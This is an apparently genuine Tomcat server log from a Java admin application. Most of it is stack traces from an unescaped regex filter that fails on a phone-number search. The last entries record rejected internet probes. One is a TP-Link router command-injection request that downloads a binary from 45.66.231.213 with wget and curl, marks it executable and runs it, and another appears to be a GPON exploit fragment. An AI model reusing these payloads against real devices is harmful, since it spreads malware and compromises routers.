	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 16:28:22.550 SEVERE [http-nio-8080-exec-2] com.sun.faces.application.view.FaceletViewHandlingStrategy.handleRenderException Error Rendering View[/admin/index.xhtml]
	java.util.regex.PatternSyntaxException: Dangling meta character '+' near index 0
+989163737949
^
		at java.base/java.util.regex.Pattern.error(Pattern.java:2027)
		at java.base/java.util.regex.Pattern.sequence(Pattern.java:2202)
		at java.base/java.util.regex.Pattern.expr(Pattern.java:2068)
		at java.base/java.util.regex.Pattern.compile(Pattern.java:1782)
		at java.base/java.util.regex.Pattern.<init>(Pattern.java:1428)
		at java.base/java.util.regex.Pattern.compile(Pattern.java:1094)
		at org.springframework.data.mongodb.core.query.Criteria.toPattern(Criteria.java:472)
		at org.springframework.data.mongodb.core.query.Criteria.regex(Criteria.java:431)
		at org.springframework.data.mongodb.core.query.Criteria.regex(Criteria.java:419)
		at da.UserService.loadAllUsersLazy(UserService.java:191)
		at com.mg.UserLazyModel.load(UserLazyModel.java:42)
		at org.primefaces.component.datatable.DataTable.loadLazyData(DataTable.java:567)
		at org.primefaces.component.datatable.feature.FilterFeature.encode(FilterFeature.java:122)
		at org.primefaces.component.datatable.DataTableRenderer.encodeEnd(DataTableRenderer.java:88)
		at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:949)
		at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1912)
		at com.sun.faces.context.PartialViewContextImpl$PhaseAwareVisitCallback.visit(PartialViewContextImpl.java:639)
		at com.sun.faces.component.visit.PartialVisitContext.invokeVisitCallback(PartialVisitContext.java:183)
		at org.primefaces.component.api.UIData.visitTree(UIData.java:913)
		at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
		at javax.faces.component.UIForm.visitTree(UIForm.java:386)
		at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
		at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
		at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
		at com.sun.faces.context.PartialViewContextImpl.processComponents(PartialViewContextImpl.java:424)
		at com.sun.faces.context.PartialViewContextImpl.processPartial(PartialViewContextImpl.java:343)
		at org.primefaces.context.PrimePartialViewContext.processPartial(PrimePartialViewContext.java:65)
		at javax.faces.context.PartialViewContextWrapper.processPartial(PartialViewContextWrapper.java:252)
		at org.omnifaces.context.OmniPartialViewContext.processPartial(OmniPartialViewContext.java:122)
		at javax.faces.component.UIViewRoot.encodeChildren(UIViewRoot.java:1124)
		at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1905)
		at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:465)
		at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:194)
		at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
		at org.ocpsoft.rewrite.faces.RewriteViewHandler.renderView(RewriteViewHandler.java:196)
		at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
		at org.omnifaces.viewhandler.OmniViewHandler.renderView(OmniViewHandler.java:115)
		at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
		at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:126)
		at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
		at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:223)
		at javax.faces.webapp.FacesServlet.service(FacesServlet.java:671)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
		at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
		at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
		at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
		at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
		at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
		at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
		at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
		at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
		at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
08-Aug-2024 16:28:22.553 SEVERE [http-nio-8080-exec-2] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError java.util.regex.PatternSyntaxException: Dangling meta character '+' near index 0
+989163737949
^
	at java.base/java.util.regex.Pattern.error(Pattern.java:2027)
	at java.base/java.util.regex.Pattern.sequence(Pattern.java:2202)
	at java.base/java.util.regex.Pattern.expr(Pattern.java:2068)
	at java.base/java.util.regex.Pattern.compile(Pattern.java:1782)
	at java.base/java.util.regex.Pattern.<init>(Pattern.java:1428)
	at java.base/java.util.regex.Pattern.compile(Pattern.java:1094)
	at org.springframework.data.mongodb.core.query.Criteria.toPattern(Criteria.java:472)
	at org.springframework.data.mongodb.core.query.Criteria.regex(Criteria.java:431)
	at org.springframework.data.mongodb.core.query.Criteria.regex(Criteria.java:419)
	at da.UserService.loadAllUsersLazy(UserService.java:191)
	at com.mg.UserLazyModel.load(UserLazyModel.java:42)
	at org.primefaces.component.datatable.DataTable.loadLazyData(DataTable.java:567)
	at org.primefaces.component.datatable.feature.FilterFeature.encode(FilterFeature.java:122)
	at org.primefaces.component.datatable.DataTableRenderer.encodeEnd(DataTableRenderer.java:88)
	at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:949)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1912)
	at com.sun.faces.context.PartialViewContextImpl$PhaseAwareVisitCallback.visit(PartialViewContextImpl.java:639)
	at com.sun.faces.component.visit.PartialVisitContext.invokeVisitCallback(PartialVisitContext.java:183)
	at org.primefaces.component.api.UIData.visitTree(UIData.java:913)
	at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
	at javax.faces.component.UIForm.visitTree(UIForm.java:386)
	at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
	at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
	at javax.faces.component.UIComponent.visitTree(UIComponent.java:1747)
	at com.sun.faces.context.PartialViewContextImpl.processComponents(PartialViewContextImpl.java:424)
	at com.sun.faces.context.PartialViewContextImpl.processPartial(PartialViewContextImpl.java:343)
	at org.primefaces.context.PrimePartialViewContext.processPartial(PrimePartialViewContext.java:65)
	at javax.faces.context.PartialViewContextWrapper.processPartial(PartialViewContextWrapper.java:252)
	at org.omnifaces.context.OmniPartialViewContext.processPartial(OmniPartialViewContext.java:122)
	at javax.faces.component.UIViewRoot.encodeChildren(UIViewRoot.java:1124)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1905)
	at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:465)
	at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:194)
	at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
	at org.ocpsoft.rewrite.faces.RewriteViewHandler.renderView(RewriteViewHandler.java:196)
	at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
	at org.omnifaces.viewhandler.OmniViewHandler.renderView(OmniViewHandler.java:115)
	at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:151)
	at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:126)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:223)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:671)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 16:32:18.530 INFO [http-nio-8080-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [h+/tmp/gpon8080&ipv=...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
08-Aug-2024 20:39:20.093 INFO [http-nio-8080-exec-4] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>+cd+%2Ftmp+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+curl+-O+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+%2Bx+r%3B+.%2Fr%20tplink)]. The valid characters are defined in RFC 7230 and RFC 3986
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:491)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
